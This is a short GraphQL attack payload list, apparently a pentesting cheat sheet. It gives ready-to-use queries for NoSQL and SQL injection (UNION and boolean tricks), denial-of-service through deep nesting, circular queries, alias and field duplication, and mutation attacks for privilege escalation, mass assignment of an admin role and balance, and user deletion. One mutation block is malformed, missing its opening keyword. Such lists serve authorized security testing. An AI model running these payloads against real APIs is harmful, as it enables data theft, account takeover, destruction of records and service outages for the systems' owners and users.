## ========================================
## NOSQL INJECTION IN GRAPHQL
## ========================================

# MongoDB-style Injection
{
  users(where: {name: {_eq: "admin"}}) {
    id
    name
    password
  }
}

{
  users(where: {name: {_regex: ".*"}}) {
    id
    name
    email
  }
}

## ========================================
## SQL INJECTION IN GRAPHQL
## ========================================

# Union-based
{
  user(id: "1' UNION SELECT NULL--") {
    name
  }
}

# Boolean-based
{
  user(id: "1' AND '1'='1") {
    name
  }
}

## ========================================
## DOS ATTACKS
## ========================================

# Circular Query (Infinite Loop)
{
  user {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                name
              }
            }
          }
        }
      }
    }
  }
}

# Deep Nesting
{
  a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z{id}}}}}}}}}}}}}}}}}}}}}}}}}}
}

# Field Duplication
{
  user(id: 1) {
    name name name name name name name name
    email email email email email email email
  }
}

# Alias Abuse
{
  u1: user(id: 1) { name }
  u2: user(id: 2) { name }
  u3: user(id: 3) { name }
  # ... repeat 1000 times
}

## MUTATION ATTACKS
## ========================================

# Privilege Escalation

  updateUser(id: 1, role: "admin") {
    id
    role
  }
}

# Mass Assignment
mutation {
  createUser(input: {
    name: "attacker"
    email: "attacker@evil.com"
    role: "admin"
    isVerified: true
    balance: 999999
  }) {
    id
    role
  }
}

# Delete Operations
mutation {
  deleteUser(id: 1) {
    success
  }
}
